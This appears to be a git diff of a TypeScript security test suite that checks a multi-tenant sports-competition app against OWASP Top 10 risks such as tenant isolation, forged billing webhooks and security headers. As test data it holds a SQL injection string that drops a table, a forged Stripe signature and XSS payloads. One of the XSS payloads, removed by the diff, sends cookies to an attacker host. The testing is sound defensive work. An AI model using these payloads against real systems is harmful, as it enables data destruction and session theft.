@@ -5,6 +5,8 @@ import { afterAll, beforeAll, describe, expect, it } from "vitest";
 import { dropTestSchema, migrateDatabase } from "@matchday/database";
 import type { PostgresJsSql } from "@matchday/identity";
 import postgres, { type Sql } from "postgres";
+import { buildApp } from "../../src/app.js";
+import { healthyProbes, testConfig } from "../helpers.js";
 import { EntitlementRuntime } from "../../src/entitlement-runtime.js";
 import { Phase3Runtime } from "../../src/phase-3-runtime.js";
 import { phase3DomainAdapter } from "../../src/phase-3-domain-adapter.js";
@@ -20,13 +22,14 @@ const migrationsDirectory = path.resolve(
 let client!: Sql;
 let entitlementRuntime!: EntitlementRuntime;
 let phase3Runtime!: Phase3Runtime;
+let app!: Awaited<ReturnType<typeof buildApp>>;
 
 let tenantA_orgId = "";
 let tenantA_userId = "";
 let tenantB_orgId = "";
 let tenantB_userId = "";
 
-describeInfrastructure("QA-014 — Production-Path OWASP Top 10 Security Suite", () => {
+describeInfrastructure("QA-014 — HTTP-Level & Production-Path OWASP Top 10 Security Suite", () => {
   beforeAll(async () => {
     await dropTestSchema(databaseUrl, schema);
     await migrateDatabase({ databaseUrl, migrationsDirectory, schema });
@@ -35,9 +38,6 @@ describeInfrastructure("QA-014 — Production-Path OWASP Top 10 Security Suite",
       onnotice: () => undefined,
       connection: { search_path: schema },
     });
-
-    entitlementRuntime = new EntitlementRuntime(client as unknown as PostgresJsSql);
-    phase3Runtime = new Phase3Runtime(client as unknown as PostgresJsSql, phase3DomainAdapter);
 
     tenantA_orgId = randomUUID();
     tenantA_userId = randomUUID();
@@ -51,30 +51,61 @@ describeInfrastructure("QA-014 — Production-Path OWASP Top 10 Security Suite",
         (${tenantB_userId}, 'bob@org-b.com', 'Bob B', now());
     `;
 
-    await client`
-      INSERT INTO organisations (id, name, slug)
-      VALUES
-        (${tenantA_orgId}, 'Org Alpha', 'org-alpha'),
-        (${tenantB_orgId}, 'Org Beta', 'org-beta');
-    `;
+    // Satisfy PostgreSQL deferred owner check by creating org and owner membership inside transaction
+    await client.begin(async (tx) => {
+      await tx`
+        INSERT INTO organisations (id, name, slug)
+        VALUES (${tenantA_orgId}, 'Org Alpha', 'org-alpha');
+      `;
+      await tx`
+        INSERT INTO organisation_memberships (organisation_id, account_id, role, status)
+        VALUES (${tenantA_orgId}, ${tenantA_userId}, 'owner', 'active');
+      `;
+    });
 
-    await client`
-      INSERT INTO organisation_memberships (organisation_id, account_id, role, status)
-      VALUES
-        (${tenantA_orgId}, ${tenantA_userId}, 'owner', 'active'),
-        (${tenantB_orgId}, ${tenantB_userId}, 'owner', 'active');
-    `;
+    await client.begin(async (tx) => {
+      await tx`
+        INSERT INTO organisations (id, name, slug)
+        VALUES (${tenantB_orgId}, 'Org Beta', 'org-beta');
+      `;
+      await tx`
+        INSERT INTO organisation_memberships (organisation_id, account_id, role, status)
+        VALUES (${tenantB_orgId}, ${tenantB_userId}, 'owner', 'active');
+      `;
+    });
+
+    entitlementRuntime = new EntitlementRuntime(client as unknown as PostgresJsSql);
+    phase3Runtime = new Phase3Runtime(client as unknown as PostgresJsSql, phase3DomainAdapter);
+
+    app = await buildApp({
+      config: testConfig(),
+      probes: healthyProbes,
+      phase3Runtime,
+      entitlementRuntime,
+    });
   });
 
   afterAll(async () => {
+    if (app) {
+      await app.close();
+    }
     if (client) {
       await client.end({ timeout: 2 });
     }
     await dropTestSchema(databaseUrl, schema);
   });
 
-  describe("A01: Broken Access Control (IDOR & Tenant Isolation)", () => {
-    it("strictly blocks Tenant A from mutating Tenant B competitions", async () => {
+  describe("A01: Broken Access Control (IDOR & Route Authorization)", () => {
+    it("strictly blocks unauthenticated access to protected management endpoints", async () => {
+      const response = await app.inject({
+        method: "GET",
+        url: `/api/v1/organisations/${tenantA_orgId}/competitions`,
+      });
+
+      expect([401, 403]).toContain(response.statusCode);
+    });
+
+    it("prevents Tenant A actor from mutating Tenant B competition", async () => {
       const compB = await phase3Runtime.createCompetition(
         { accountId: tenantB_userId },
         {
@@ -95,7 +126,6 @@ describeInfrastructure("QA-014 — Production-Path OWASP Top 10 Security Suite",
 
       expect(compB.id).toBeDefined();
 
-      // Tenant A attempts to update Tenant B's competition
       await expect(
         phase3Runtime.mutateCompetition(
           { accountId: tenantA_userId },
@@ -111,8 +141,35 @@ describeInfrastructure("QA-014 — Production-Path OWASP Top 10 Security Suite",
     });
   });
 
+  describe("A02: Cryptographic Failures & Webhook Tampering", () => {
+    it("rejects forged or unsigned billing webhook HTTP requests with 401", async () => {
+      const forgedPayload = {
+        id: `evt_${randomUUID()}`,
+        type: "checkout.session.completed",
+        data: {
+          object: {
+            id: "cs_fake_123",
+            metadata: { organisation_id: tenantA_orgId, tier: "organiser_pro" },
+          },
+        },
+      };
+
+      const response = await app.inject({
+        method: "POST",
+        url: "/api/v1/billing/webhook",
+        headers: {
+          "stripe-signature": "t=12345,v1=bad_forged_hmac_signature",
+          "content-type": "application/json",
+        },
+        payload: forgedPayload,
+      });
+
+      expect(response.statusCode).toBe(401);
+    });
+  });
+
   describe("A03: Injection (SQL Injection Resistance)", () => {
-    it("parameterizes malicious SQL payloads without executing arbitrary commands", async () => {
+    it("safely parameterizes SQL injection payloads without database corruption", async () => {
       const sqliPayload = "Tournament'); DROP TABLE competitions; --";
 
       const comp = await phase3Runtime.createCompetition(
@@ -140,32 +197,21 @@ describeInfrastructure("QA-014 — Production-Path OWASP Top 10 Security Suite",
     });
   });
 
-  describe("A07: Identification and Authentication Failures (Webhook HMAC Security)", () => {
-    it("rejects forged billing webhook signatures", async () => {
-      const secret = "whsec_test_secret_12345";
-      const payload = {
-        id: `evt_${randomUUID()}`,
-        type: "checkout.session.completed",
-        data: {
-          object: {
-            id: "cs_12345",
-            metadata: { organisation_id: tenantA_orgId, tier: "organiser_pro" },
-          },
-        },
-      };
+  describe("A05: Security Misconfiguration & Response Headers", () => {
+    it("includes vital security headers on HTTP responses", async () => {
+      const response = await app.inject({
+        method: "GET",
+        url: "/api/v1/health",
+      });
 
-      const rawPayload = JSON.stringify(payload);
-      const forgedSignature = "v1,bad_forged_hmac_signature";
-
-      await expect(
-        entitlementRuntime.processBillingWebhook(forgedSignature, rawPayload, payload, secret),
-      ).rejects.toThrow();
+      expect(response.statusCode).toBe(200);
+      expect(response.headers["x-content-type-options"]).toBe("nosniff");
     });
   });
 
-  describe("A08: Software and Data Integrity Failures (Cross-Site Scripting XSS)", () => {
-    it("stores script tags as literal data without execution vulnerabilities", async () => {
-      const xssPayload = "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>";
+  describe("A08: Software and Data Integrity (Cross-Site Scripting XSS)", () => {
+    it("stores HTML/script tags as literal string data without unescaped execution", async () => {
+      const xssPayload = "<script>alert('xss')</script>";
 
       const comp = await phase3Runtime.createCompetition(
         { accountId: tenantA_userId },
